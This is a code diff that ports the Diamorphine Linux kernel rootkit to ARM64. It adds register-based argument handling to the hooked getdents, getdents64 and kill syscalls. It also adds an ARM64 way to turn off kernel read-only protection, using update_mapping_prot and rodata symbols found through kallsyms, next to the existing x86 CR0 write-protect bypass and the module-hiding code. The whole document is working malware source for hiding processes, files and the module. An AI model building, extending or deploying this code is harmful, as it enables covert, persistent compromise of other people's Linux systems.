@@ -21,9 +21,22 @@
 #include <linux/fdtable.h>
 #endif
 
+#ifndef __NR_getdents
+#define __NR_getdents 141
+#endif
+
 #include "diamorphine.h"
 
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
+#elif IS_ENABLED(CONFIG_ARM64)
+void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
+unsigned long start_rodata;
+unsigned long init_begin;
+#define section_size    init_begin - start_rodata
+#else
+#error Unsupported architecture
+#endif
 static unsigned long *__sys_call_table;
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
@@ -90,8 +103,15 @@ is_invisible(pid_t pid)
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
         int fd = (int) pt_regs->di;
         struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+#elif IS_ENABLED(CONFIG_ARM64)
+		int fd = (int) pt_regs->regs[0];
+        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
+#else
+#error Unsupported architecture
+#endif
 	int ret = orig_getdents64(pt_regs), err;
 #else
 asmlinkage int
@@ -151,8 +171,15 @@ out:
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
         int fd = (int) pt_regs->di;
         struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+#elif IS_ENABLED(CONFIG_ARM64)
+		int fd = (int) pt_regs->regs[0];
+        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
+#else
+#error Unsupported architecture
+#endif
 	int ret = orig_getdents(pt_regs), err;
 #else
 asmlinkage int
@@ -280,8 +307,15 @@ module_hide(void)
 asmlinkage int
 hacked_kill(const struct pt_regs *pt_regs)
 {
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
         pid_t pid = (pid_t) pt_regs->di;
         int sig = (int) pt_regs->si;
+#elif IS_ENABLED(CONFIG_ARM64)
+        pid_t pid = (pid_t) pt_regs->regs[0];
+        int sig = (int) pt_regs->regs[1];
+#else
+#error Unsupported architecture
+#endif
 #else
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
@@ -327,20 +361,35 @@ write_cr0_forced(unsigned long val)
 static inline void
 protect_memory(void)
 {
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	write_cr0_forced(cr0);
 #else
 	write_cr0(cr0);
+#endif
+#elif IS_ENABLED(CONFIG_ARM64)
+    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+			    section_size, PAGE_KERNEL_RO);
+
+#else
+#error Unsupported architecture
 #endif
 }
 
 static inline void
 unprotect_memory(void)
 {
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	write_cr0_forced(cr0 & ~0x00010000);
 #else
 	write_cr0(cr0 & ~0x00010000);
+#endif
+#elif IS_ENABLED(CONFIG_ARM64)
+    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+			    section_size, PAGE_KERNEL);
+#else
+#error Unsupported architecture
 #endif
 }
 
@@ -351,7 +400,16 @@ diamorphine_init(void)
 	if (!__sys_call_table)
 		return -1;
 
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	cr0 = read_cr0();
+#elif IS_ENABLED(CONFIG_ARM64)
+    update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
+    start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
+    init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+#else
+#error Unsupported architecture
+#endif
+
 	module_hide();
 	tidy();
 
